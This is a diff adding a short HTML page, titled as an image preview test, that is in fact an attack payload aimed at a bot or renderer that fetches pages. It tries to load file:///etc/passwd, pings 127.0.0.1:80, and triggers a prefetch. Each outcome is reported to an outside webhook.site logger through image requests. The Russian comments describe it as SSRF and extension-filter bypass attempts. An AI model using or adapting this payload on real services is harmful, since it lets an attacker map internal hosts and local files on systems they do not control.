@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Preview Test</title>
+</head>
+<body>
+    <script>
+        const target = "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349"; // СМЕНИ ДОМЕН!
+
+        function report(path) {
+            var img = new Image();
+            img.src = target + "/" + path + "?t=" + Date.now();
+        }
+
+        // Попытка №1: Проверка локального файла через Error-based SSRF
+        // Если картинка "не грузится", мы узнаем, есть ли там файл
+        var testLfi = new Image();
+        testLfi.onload = () => report("LFI_SUCCESS_FILE_EXISTS");
+        testLfi.onerror = () => report("LFI_FAILED_OR_BLOCKED");
+        testLfi.src = "file:///etc/passwd"; 
+
+        // Попытка №2: Обход фильтра расширений
+        // Мы просим бота скачать "картинку", которая на самом деле ведет на наш логгер
+        var trigger = document.createElement('link');
+        trigger.rel = "prefetch";
+        trigger.href = target + "/BOT_TRIGGERED_PREFETCH";
+        document.head.appendChild(trigger);
+    </script>
+
+    <link rel="stylesheet" href="http://127.0.0.1:80/style.css" onerror="new Image().src='https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/LOCAL_PORT_80_ALIVE'">
+
+</body>
+</html>
